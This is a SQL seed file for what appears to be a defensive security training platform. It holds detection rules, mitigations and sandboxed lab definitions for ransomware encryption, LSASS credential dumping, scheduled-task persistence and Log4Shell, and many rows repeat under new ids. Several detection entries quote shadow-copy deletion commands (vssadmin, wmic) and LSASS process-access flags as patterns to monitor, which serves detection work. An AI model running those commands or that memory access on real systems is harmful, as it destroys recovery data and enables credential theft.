INSERT INTO detections (id, entity_id, title, description) VALUES (30, 'T1486', 'Mass File Rename / Extension Alteration Alert', 'Detect rapid file rename events exceeding 50 modifications/sec with entropy > 7.5 indicating cryptographic cipher activity.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (31, 'T1486', 'Volume Shadow Copy Deletion (Event 4688 / Sysmon 1)', 'Monitor execution of vssadmin.exe delete shadows /all /quiet or wmic shadowcopy delete which precedes ransomware execution.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (32, 'T1003.001', 'Sysmon Event 10: Process Access to LSASS', 'Monitor for non-SYSTEM processes opening handles with PROCESS_VM_READ (0x0010) or PROCESS_CREATE_PROCESS (0x0080) to lsass.exe.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (33, 'T1003.001', 'Windows Defender Credential Guard Audit', 'Enable Credential Guard (LSA Protection) via Group Policy to run LSASS as Protected Process Light (PPL).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (34, 'APT29', 'Abnormal Cloud OAuth App Consent Detection', 'Monitor Azure AD / Entra ID audit logs for high-privilege service principal role assignments and OAuth app registrations.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (35, 'T1486', 'Mass File Rename / Extension Alteration Alert', 'Detect rapid file rename events exceeding 50 modifications/sec with entropy > 7.5 indicating cryptographic cipher activity.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (36, 'T1486', 'Volume Shadow Copy Deletion (Event 4688 / Sysmon 1)', 'Monitor execution of vssadmin.exe delete shadows /all /quiet or wmic shadowcopy delete which precedes ransomware execution.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (37, 'T1003.001', 'Sysmon Event 10: Process Access to LSASS', 'Monitor for non-SYSTEM processes opening handles with PROCESS_VM_READ (0x0010) or PROCESS_CREATE_PROCESS (0x0080) to lsass.exe.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (38, 'T1003.001', 'Windows Defender Credential Guard Audit', 'Enable Credential Guard (LSA Protection) via Group Policy to run LSASS as Protected Process Light (PPL).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (39, 'APT29', 'Abnormal Cloud OAuth App Consent Detection', 'Monitor Azure AD / Entra ID audit logs for high-privilege service principal role assignments and OAuth app registrations.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (40, 'T1486', 'Mass File Rename / Extension Alteration Alert', 'Detect rapid file rename events exceeding 50 modifications/sec with entropy > 7.5 indicating cryptographic cipher activity.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (41, 'T1486', 'Volume Shadow Copy Deletion (Event 4688 / Sysmon 1)', 'Monitor execution of vssadmin.exe delete shadows /all /quiet or wmic shadowcopy delete which precedes ransomware execution.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (42, 'T1003.001', 'Sysmon Event 10: Process Access to LSASS', 'Monitor for non-SYSTEM processes opening handles with PROCESS_VM_READ (0x0010) or PROCESS_CREATE_PROCESS (0x0080) to lsass.exe.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (43, 'T1003.001', 'Windows Defender Credential Guard Audit', 'Enable Credential Guard (LSA Protection) via Group Policy to run LSASS as Protected Process Light (PPL).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (44, 'APT29', 'Abnormal Cloud OAuth App Consent Detection', 'Monitor Azure AD / Entra ID audit logs for high-privilege service principal role assignments and OAuth app registrations.') ON CONFLICT DO NOTHING;

-- Seeding mitigations (22 rows)
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (19, 'T1053.005', 'M1047', 'Audit Tasks and Restrict Access', 'Configure Group Policy to prevent non-administrative users from scheduling jobs.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (20, 'T1053.005', 'M1028', 'Operating System Configuration', 'Enable PowerShell Constrained Language Mode and Script Block Logging (Event 4104).') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (21, 'APT3', 'M1049', 'Antivirus / Antimalware', 'Automatically scan and quarantine attachments at the gateway and endpoint.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (22, 'APT3', 'M1017', 'User Training', 'Train personnel to identify spearphishing social engineering lures.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (23, 'CVE-2021-44228', 'M1051', 'Patch Management', 'Upgrade Apache Log4j to version 2.17.1 or higher.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (24, 'CVE-2021-44228', 'M1038', 'Execution Prevention', 'Set system property log4j2.formatMsgNoLookups=true or remove JndiLookup class from classpath.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (25, 'T1486', 'M1053', 'Data Backup & Offline Replication', 'Maintain immutable, air-gapped, or write-once-read-many (WORM) backups disconnected from the primary network directory.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (26, 'T1486', 'M1040', 'Behavior Prevention on Storage Systems', 'Configure endpoint and network file shares with anti-ransomware canary traps and automated account isolation triggers.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (27, 'T1003.001', 'M1027', 'Run LSASS as Protected Process Light (PPL)', 'Configure registry key HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1 to prevent unsigned processes from opening memory handles.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (28, 'T1003.001', 'M1043', 'Credential Guard Isolation', 'Utilize Virtualization-Based Security (VBS) to isolate LSA secrets inside a secure micro-hypervisor container.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (29, 'T1486', 'M1053', 'Data Backup & Offline Replication', 'Maintain immutable, air-gapped, or write-once-read-many (WORM) backups disconnected from the primary network directory.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (30, 'T1486', 'M1040', 'Behavior Prevention on Storage Systems', 'Configure endpoint and network file shares with anti-ransomware canary traps and automated account isolation triggers.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (31, 'T1003.001', 'M1027', 'Run LSASS as Protected Process Light (PPL)', 'Configure registry key HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1 to prevent unsigned processes from opening memory handles.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (32, 'T1003.001', 'M1043', 'Credential Guard Isolation', 'Utilize Virtualization-Based Security (VBS) to isolate LSA secrets inside a secure micro-hypervisor container.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (33, 'T1486', 'M1053', 'Data Backup & Offline Replication', 'Maintain immutable, air-gapped, or write-once-read-many (WORM) backups disconnected from the primary network directory.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (34, 'T1486', 'M1040', 'Behavior Prevention on Storage Systems', 'Configure endpoint and network file shares with anti-ransomware canary traps and automated account isolation triggers.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (35, 'T1003.001', 'M1027', 'Run LSASS as Protected Process Light (PPL)', 'Configure registry key HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1 to prevent unsigned processes from opening memory handles.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (36, 'T1003.001', 'M1043', 'Credential Guard Isolation', 'Utilize Virtualization-Based Security (VBS) to isolate LSA secrets inside a secure micro-hypervisor container.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (37, 'T1486', 'M1053', 'Data Backup & Offline Replication', 'Maintain immutable, air-gapped, or write-once-read-many (WORM) backups disconnected from the primary network directory.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (38, 'T1486', 'M1040', 'Behavior Prevention on Storage Systems', 'Configure endpoint and network file shares with anti-ransomware canary traps and automated account isolation triggers.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (39, 'T1003.001', 'M1027', 'Run LSASS as Protected Process Light (PPL)', 'Configure registry key HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1 to prevent unsigned processes from opening memory handles.') ON CONFLICT DO NOTHING;
INSERT INTO mitigations (id, entity_id, mitigation_id, title, description) VALUES (40, 'T1003.001', 'M1043', 'Credential Guard Isolation', 'Utilize Virtualization-Based Security (VBS) to isolate LSA secrets inside a secure micro-hypervisor container.') ON CONFLICT DO NOTHING;

-- Seeding labs (5 rows)
INSERT INTO labs (lab_id, technique_id, technique_name, available, launchable, lab_type, platform, runtime_environment, network_mode, validation_source, objective, estimated_duration, difficulty, safety_boundary, session_steps, scenario_objective, created_at) VALUES ('lab_log4shell_linux', 'CVE-2021-44228', 'Log4Shell Exploitation & Detection Lab', TRUE, TRUE, 'interactive_container', 'linux', 'Isolated Docker Sandbox', 'airgapped', 'SYNTRA Research Lab', 'Inspect server logs and network egress alerts when JNDI lookup strings are processed.', '20 min', 'Advanced', 'Air-gapped container network namespace with loopback-only sockets.', '["Access isolated Linux target container", "Run mock vulnerable Java Spring Boot application", "Send test payload with JNDI mock reference", "Observe and document log parsing behavior"]'::jsonb, 'Identify and prevent Log4Shell JNDI injection attempts in application logs.', '2026-11-11 17:07:38.488818+02:00') ON CONFLICT DO NOTHING;
INSERT INTO labs (lab_id, technique_id, technique_name, available, launchable, lab_type, platform, runtime_environment, network_mode, validation_source, objective, estimated_duration, difficulty, safety_boundary, session_steps, scenario_objective, created_at) VALUES ('lab_ransomware_sim', 'T1486', 'Ransomware Encryption & Shadow Copy Defense', TRUE, TRUE, 'adversary_emulation', 'windows', 'Windows Server 2022 Sandbox', 'air-gapped', 'Atomic Red Team T1486', 'Detect volume shadow copy deletion and simulate safe benign file alteration', '20m', 'Medium', 'Zero-network egress, benign canary files only', '["Open PowerShell in Admin mode", "Inspect benign target files in C:\\TestShare", "Run benign encryption simulator", "Analyze Sysmon event logs in Event Viewer"]'::jsonb, 'Understand ransomware mechanics and write behavioral Sigma rules', '2026-11-14 21:34:39.320579+02:00') ON CONFLICT DO NOTHING;
INSERT INTO labs (lab_id, technique_id, technique_name, available, launchable, lab_type, platform, runtime_environment, network_mode, validation_source, objective, estimated_duration, difficulty, safety_boundary, session_steps, scenario_objective, created_at) VALUES ('lab_lsass_dump', 'T1003.001', 'LSASS Memory Protection & Credential Guard Lab', TRUE, TRUE, 'defense_validation', 'windows', 'Windows 11 Enterprise (VBS Enabled)', 'isolated', 'MITRE ATT&CK T1003.001', 'Verify RunAsPPL and Credential Guard blocking memory inspection tools', '25m', 'Intermediate', 'Isolated sandboxed memory space', '["Inspect default LSASS process protection status", "Execute non-PPL inspection test", "Enable RunAsPPL in registry", "Verify handle access denied (0x5)"]'::jsonb, 'Implement hardening against credential theft tools like Mimikatz', '2026-11-14 21:34:39.320579+02:00') ON CONFLICT DO NOTHING;
INSERT INTO labs (lab_id, technique_id, technique_name, available, launchable, lab_type, platform, runtime_environment, network_mode, validation_source, objective, estimated_duration, difficulty, safety_boundary, session_steps, scenario_objective, created_at) VALUES ('lab_t1053_win', 'T1053.005', 'Scheduled Task Persistence Lab', TRUE, TRUE, 'interactive_vm', 'windows', 'Isolated Sandbox Hypervisor', 'airgapped', 'MITRE Enterprise', 'Observe Windows Event Logs when creating persistence tasks', '15 min', 'Intermediate', 'Strict sandbox egress filtering', '["Log in to target Windows Server VM", "Run benign schtasks simulation script", "Inspect Event Viewer Security log for Event 4698 (A scheduled task was created)"]'::jsonb, 'Detect unauthorized task creation', '2026-11-11 17:07:38.487010+02:00') ON CONFLICT DO NOTHING;
INSERT INTO labs (lab_id, technique_id, technique_name, available, launchable, lab_type, platform, runtime_environment, network_mode, validation_source, objective, estimated_duration, difficulty, safety_boundary, session_steps, scenario_objective, created_at) VALUES ('LAB-T1059', 'T1059', 'Command and Scripting Interpreter', TRUE, TRUE, 'Controlled Technique Validation', 'windows', 'Windows Virtual Machine (VM)', 'Isolated Lab Network', 'SYNTRA Research Lab', 'Safely observe and validate the behavior associated with T1059 inside a controlled and isolated environment.', '10–15 Minutes', 'Intermediate', 'The lab runs in an isolated environment and is not intended for use against external or unauthorized systems.', '["Review the scenario and objective.", "Access the Windows VM and open the required tools.", "Execute the provided commands or script in the lab environment.", "Observe the expected behavior (processes, logs, artifacts).", "Collect evidence and compare with the expected results.", "Complete the lab and view the validation result."]'::jsonb, 'Safely observe and validate the behavior associated with T1059 inside an isolated Windows virtual machine.', '2026-11-11 17:07:38.488462+02:00') ON CONFLICT DO NOTHING;
